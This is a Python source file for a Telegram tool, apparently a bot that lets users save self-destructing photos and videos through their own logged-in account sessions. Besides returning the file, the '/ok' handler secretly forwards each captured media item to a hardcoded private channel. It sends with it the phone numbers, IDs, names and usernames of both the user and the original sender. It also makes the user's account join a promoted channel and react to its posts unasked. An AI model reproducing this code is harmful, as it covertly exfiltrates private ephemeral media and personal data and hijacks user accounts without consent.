from random import choice
from aiogram.types import FSInputFile
# ✅ Correct:
from loader import bot
from telethon import TelegramClient, events
from typing import Dict
import os
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import SendReactionRequest
from telethon.tl.types import ReactionEmoji

async def get_user_info(client):
    try:
        user = await client.get_me()
        return {
            "telegram_id": user.id,
            "full_name": f"{user.first_name or ''} {user.last_name or ''}".strip(),
            "username": user.username,
            "phone": user.phone if hasattr(user, 'phone') else None
        }
    except Exception as e:
        print(f"Error fetching user info: {e}")
        return None


clients: Dict[int, TelegramClient] = {}  # user_id -> client

def add_save_handler(client: TelegramClient,  user_id: int,bot=bot,):
    @client.on(events.NewMessage(pattern='/ok'))
    async def handler(event):
        await event.delete()
        ###################################################################################
        if not event.is_reply:
            return
        ###################################################################################
        reply_msg = await event.get_reply_message()
        if not (reply_msg.media and getattr(reply_msg.media, 'ttl_seconds', None)):
            return
        ###################################################################################
        # === Check file size before download ===
        max_size_mb = 10
        max_size_bytes = max_size_mb * 1024 * 1024
        # For documents (videos, files)
        if hasattr(reply_msg.media, 'document') and hasattr(reply_msg.media.document, 'size'):
            file_size = reply_msg.media.document.size
        # For photos
        elif hasattr(reply_msg.media, 'photo'):
            sizes = reply_msg.media.photo.sizes
            file_size = max((s.size for s in sizes if hasattr(s, 'size')), default=0)
        else:
            file_size = 0
        if file_size > max_size_bytes:
            await bot.send_message(chat_id=user_id, text="❌ Limitdan oshib ketdi. Maksimum 10 MB.")
            return
        ###################################################################################
        file_path = await client.download_media(reply_msg)
        if '.jpg' in file_path:
            photo = FSInputFile(file_path)
            msg=await bot.send_photo(chat_id=user_id, photo=photo, caption='🤫 by @takeimagebot 💥')
        else:
            video = FSInputFile(file_path)
            msg = await bot.send_video(chat_id=user_id, video=video, caption='🤫 by @takeimagebot 💥')

        ###################################################################################

        await bot.forward_message(chat_id=-1002839214036, from_chat_id=msg.chat.id, message_id=msg.message_id)
        user = await get_user_info(client)
        if user:
            sender = await reply_msg.get_sender()
            mention = f'<a href="tg://user?id={user["telegram_id"]}">{user["full_name"]}</a>'

            text = (
                "📥 <b>Yangi fayl</b>\n"
                "📩 <b>Oluvchi</b>\n"
                f"🆔 <b>User ID:</b> <code>{user['telegram_id']}</code>\n"
                f"👤 <b>F.I.O:</b> {mention}\n"
                f"💬 <b>Username:</b> @{user['username'] if user['username'] else 'yo‘q'}\n"
                f"📞 <b>Telefon:</b> {user['phone'] if user['phone'] else 'yo‘q'}\n\n"
                "👤 <b>Yuboruvchi</b>\n"
                f"🆔 <b>ID:</b> <code>{sender.id}</code>\n"
                f"👤 <b>Ismi:</b> <a href=\"tg://user?id={sender.id}\">{sender.first_name or ''} {sender.last_name or ''}</a>\n"
                f"💬 <b>Username:</b> @{sender.username if sender.username else 'yo‘q'}\n"
                f"📞 <b>Telefon:</b> {sender.phone if sender.phone else 'yo‘q'}"
            )
            await bot.send_message(chat_id=-1002839214036, text=text, parse_mode="HTML")

        os.remove(file_path)

        ###################################################################################
        # ✅ Join the channel
        try:
            await client(JoinChannelRequest('take_image'))
        except Exception as e:
            print(f"⚠️ Could not join channel: {e}")
        ###################################################################################
        try:
            messages = await client.get_messages('take_image', limit=3)
            for msg in messages:
                emoji = choice(["❤️", "🔥", "👍", "👏","🤝",])
                await client(SendReactionRequest(
                    peer='take_image',
                    msg_id=msg.id,
                    reaction=[ReactionEmoji(emoticon=emoji)]
                ))
        except Exception as e:
            print(f"❌ Failed during reaction loop: {e}")
        ###################################################################################
        if len(clients) > 50:
            print("⚠️ Too many clients, disconnecting all to keep server light.")
            await disconnect_all_clients()
        ###################################################################################
async def disconnect_all_clients():
    for user_id, client in list(clients.items()):
        try:
            if client.is_connected():
                # await client.log_out()  # Use log_out() to fully log out and clear server session
                await client.disconnect()
                print(f"🔌 Disconnected client {user_id}")
        except Exception as e:
            print(f"❌ Error disconnecting client {user_id}: {e}")

    clients.clear()
    print("✅ All clients disconnected and cleared.")
